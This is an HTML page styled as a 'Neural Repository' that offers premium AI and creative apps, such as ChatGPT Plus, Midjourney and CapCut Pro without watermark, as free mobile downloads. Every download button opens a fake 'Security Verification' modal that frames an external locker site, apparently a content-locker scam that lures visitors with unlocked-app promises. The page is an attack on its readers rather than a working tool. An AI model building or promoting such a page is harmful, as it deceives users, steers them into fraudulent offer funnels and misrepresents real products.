<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS // Neural Repository 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg: #09090b;
            --accent: #6366f1;
            --zinc-800: #27272a;
        }

        body {
            background-color: var(--bg);
            color: #fafafa;
            font-family: 'Inter', sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        .mono { font-family: 'JetBrains Mono', monospace; }

        /* Subtle mesh for depth */
        .bg-mesh {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: 
                radial-gradient(circle at 50% -20%, rgba(99, 102, 241, 0.15), transparent 80%),
                radial-gradient(circle at 0% 100%, rgba(39, 39, 42, 0.2), transparent 50%);
            z-index: -1;
        }

        .bento-card {
            background: rgba(24, 24, 27, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .bento-card:hover {
            border-color: rgba(99, 102, 241, 0.4);
            background: rgba(24, 24, 27, 0.8);
            transform: translateY(-4px);
            box-shadow: 0 20px 40px -20px rgba(0, 0, 0, 0.5);
        }

        #app-viewer {
            background: rgba(9, 9, 11, 0.98);
            backdrop-filter: blur(30px);
            opacity: 0;
            pointer-events: none;
            transition: all 0.5s ease;
        }

        #app-viewer.active {
            opacity: 1;
            pointer-events: auto;
        }

        .platform-btn {
            transition: all 0.2s ease;
        }

        .platform-btn.active {
            background: #27272a;
            color: white;
            border-color: #3f3f46;
        }
    </style>
</head>
<body class="selection:bg-indigo-500/30">
    <div class="bg-mesh"></div>

    <nav class="max-w-7xl mx-auto px-6 py-10 flex justify-between items-center">
        <div class="flex items-center gap-4">
            <div class="w-8 h-8 bg-white text-black flex items-center justify-center rounded-lg font-black text-sm italic">N</div>
            <span class="text-sm font-semibold tracking-[0.2em] uppercase opacity-90">Nexus Hub</span>
        </div>
        <div class="flex items-center gap-6">
            <div class="hidden md:flex gap-4 mono text-[10px] uppercase tracking-widest opacity-40">
                <span>Secure_Terminal</span>
                <span>Node_04</span>
            </div>
            <div class="h-4 w-[1px] bg-zinc-800"></div>
            <span class="mono text-[10px] text-indigo-400">v6.4.0_Stable</span>
        </div>
    </nav>

    <header class="max-w-7xl mx-auto px-6 pt-12 pb-24">
        <h1 class="text-5xl md:text-7xl font-semibold tracking-tight leading-tight mb-6">
            Intelligent <span class="text-zinc-500">Infrastructure.</span>
        </h1>
        <p class="max-w-2xl text-zinc-400 text-lg leading-relaxed">
            Access the high-performance generative suite. Verified neural nodes for 2026 enterprise deployment.
        </p>
    </header>

    <main id="grid" class="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-4 gap-4 mb-20"></main>

    <div id="app-viewer" class="fixed inset-0 z-[100] hidden flex-col p-6 md:p-20 overflow-y-auto">
        <div class="max-w-6xl mx-auto w-full">
            <button onclick="closeViewer()" class="mb-16 flex items-center gap-2 text-zinc-500 hover:text-white transition-colors mono text-[10px] uppercase tracking-widest">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5m7-7l-7 7 7 7"/></svg>
                Back to Grid
            </button>
            <div id="viewer-content"></div>
        </div>
    </div>

    <div id="locker-modal" class="fixed inset-0 z-[200] bg-black/80 backdrop-blur-md hidden items-center justify-center p-4">
        <div class="w-full max-w-lg bg-[#121214] rounded-2xl overflow-hidden border border-zinc-800 shadow-2xl relative">
            <div class="p-4 border-b border-zinc-800 flex justify-between items-center bg-zinc-900/50">
                <span class="mono text-[10px] uppercase tracking-widest text-zinc-500">Security Verification</span>
                <button onclick="closeLocker()" class="text-zinc-500 hover:text-white transition-colors">✕</button>
            </div>
            <div class="aspect-[4/5] w-full bg-black">
                <iframe src="https://appchecker.space/cl/i/6nnlj7" frameborder="0" class="w-full h-full"></iframe>
            </div>
        </div>
    </div>

    <script>
        const appData = [
            { name: 'DeepSeek R1', tag: 'Logic', size: 'md:col-span-2 md:row-span-2', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/deepseek-logo-icon.png', desc: 'The leading open-source model for 2026. Specialized for complex code architecture and mathematics.', feats: ['DeepThink V3 Logic', 'Coder-V2 Native', 'Bypass Logic Mode'] },
            { name: 'Midjourney AI', tag: 'Visual', size: 'md:col-span-2', logo: 'https://upload.wikimedia.org/wikipedia/commons/e/e6/Midjourney_Emblem.png', desc: 'Hyper-realistic visual generation with cinematic v6.1 reasoning.', feats: ['V6.1 Engine', 'Stealth Generation', 'High-Res Upscaling'] },
            { name: 'Claude 3.5', tag: 'Reasoning', size: 'md:col-span-1', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/claude-ai-icon.png', desc: 'Unmatched performance in technical writing and analysis.', feats: ['Artifacts UI', '200k Context Window'] },
            { name: 'ChatGPT Plus', tag: 'Universal', size: 'md:col-span-1', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/chatgpt-icon.png', desc: 'Full access to GPT-4o, DALL-E 3, and advanced voice protocols.', feats: ['GPT-4o Native', 'Advanced Voice Pro'] },
            { name: 'CapCut Pro', tag: 'Video', size: 'md:col-span-1', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/capcut-icon.png', desc: 'Social dominance tool. Unlock all 4K raw templates and AI VFX.', feats: ['4K Raw Output', 'No Watermark'] },
            { name: 'Perplexity', tag: 'Research', size: 'md:col-span-2', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/perplexity-ai-icon.png', desc: 'Real-time research with source verification and model switching.', feats: ['Live Citations', 'Ad-Free Logic'] },
            { name: 'Gemini Ultra', tag: 'Suite', size: 'md:col-span-1', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/google-gemini-icon.png', desc: 'Deep integration with the entire Workspace ecosystem.', feats: ['Workspace Sync', 'Ultra Logic 1.5'] },
            { name: 'Canva Pro', tag: 'Design', size: 'md:col-span-1', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/canva-icon.png', desc: 'Full Magic Studio access with 100M+ premium assets.', feats: ['Magic Resizer', 'AI Background Edit'] }
        ];

        let selectedPlatform = 'ios';

        function init() {
            const grid = document.getElementById('grid');
            appData.forEach((app, i) => {
                grid.innerHTML += `
                    <div class="bento-card ${app.size} p-6 flex flex-col justify-between group cursor-pointer" onclick="openViewer(${i})">
                        <div>
                            <div class="flex justify-between items-start mb-10">
                                <div class="w-12 h-12 bg-zinc-900 rounded-xl p-2.5 border border-zinc-800 group-hover:border-zinc-700 transition-colors">
                                    <img src="${app.logo}" class="w-full h-full object-contain grayscale group-hover:grayscale-0 transition-all duration-500">
                                </div>
                                <span class="mono text-[9px] font-medium text-zinc-500 border border-zinc-800 px-2 py-0.5 rounded uppercase tracking-widest">${app.tag}</span>
                            </div>
                            <h3 class="text-xl font-medium mb-2 tracking-tight">${app.name}</h3>
                            <p class="text-sm text-zinc-500 leading-relaxed line-clamp-3">${app.desc}</p>
                        </div>
                        <div class="mt-8 pt-6 border-t border-zinc-800/50 flex justify-between items-center">
                            <button onclick="event.stopPropagation(); openLocker();" class="text-[10px] mono uppercase tracking-widest bg-zinc-100 text-zinc-900 px-4 py-2 rounded-lg font-bold hover:bg-white transition-colors">
                                Deploy Node
                            </button>
                            <div class="w-8 h-8 rounded-full border border-zinc-800 flex items-center justify-center group-hover:bg-zinc-800 transition-colors">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14m-7-7l7 7-7 7"/></svg>
                            </div>
                        </div>
                    </div>
                `;
            });
        }

        function openViewer(idx) {
            const app = appData[idx];
            const viewer = document.getElementById('app-viewer');
            viewer.classList.remove('hidden');
            setTimeout(() => viewer.classList.add('active'), 10);

            document.getElementById('viewer-content').innerHTML = `
                <div class="grid lg:grid-cols-5 gap-16 items-start">
                    <div class="lg:col-span-3 space-y-8">
                        <div class="flex items-center gap-6">
                            <div class="w-20 h-20 bg-zinc-900 border border-zinc-800 rounded-3xl p-4">
                                <img src="${app.logo}" class="w-full h-full object-contain">
                            </div>
                            <div>
                                <h2 class="text-5xl font-semibold tracking-tight">${app.name}</h2>
                                <p class="text-indigo-400 mono text-xs mt-2 uppercase tracking-[0.2em]">${app.tag} Node</p>
                            </div>
                        </div>
                        
                        <p class="text-xl text-zinc-400 leading-relaxed max-w-2xl">${app.desc}</p>

                        <div class="flex flex-wrap gap-4 pt-4">
                            <button onclick="openLocker()" class="px-10 py-5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-2xl font-semibold transition-all flex items-center gap-3">
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14m7-7l-7 7-7-7"/></svg>
                                Deploy Framework
                            </button>
                            <div class="flex p-1.5 bg-zinc-900 border border-zinc-800 rounded-2xl">
                                <button onclick="setPlatform('ios')" id="btn-ios" class="platform-btn active px-6 py-3 rounded-xl text-xs font-bold uppercase mono tracking-widest">iOS</button>
                                <button onclick="setPlatform('android')" id="btn-android" class="platform-btn px-6 py-3 rounded-xl text-xs font-bold uppercase mono tracking-widest text-zinc-500">Android</button>
                            </div>
                        </div>
                    </div>

                    <div class="lg:col-span-2 bg-zinc-900/50 border border-zinc-800 rounded-[32px] p-8 space-y-8">
                        <h4 class="mono text-[10px] text-zinc-500 uppercase tracking-widest">Deployment Parameters</h4>
                        <div class="space-y-4">
                            ${app.feats.map(f => `
                                <div class="flex items-center gap-4 p-4 bg-zinc-900 border border-zinc-800 rounded-xl">
                                    <div class="w-2 h-2 rounded-full bg-indigo-500"></div>
                                    <span class="text-sm font-medium text-zinc-300">${f}</span>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                </div>
            `;
        }

        function setPlatform(p) {
            selectedPlatform = p;
            document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active', 'text-white'));
            document.querySelectorAll('.platform-btn').forEach(b => b.classList.add('text-zinc-500'));
            const activeBtn = document.getElementById(`btn-${p}`);
            activeBtn.classList.add('active');
            activeBtn.classList.remove('text-zinc-500');
        }

        function closeViewer() {
            const viewer = document.getElementById('app-viewer');
            viewer.classList.remove('active');
            setTimeout(() => viewer.classList.add('hidden'), 500);
        }

        function openLocker() { document.getElementById('locker-modal').classList.remove('hidden'); document.getElementById('locker-modal').classList.add('flex'); }
        function closeLocker() { document.getElementById('locker-modal').classList.add('hidden'); document.getElementById('locker-modal').classList.remove('flex'); }

        init();
    </script>
</body>
</html>
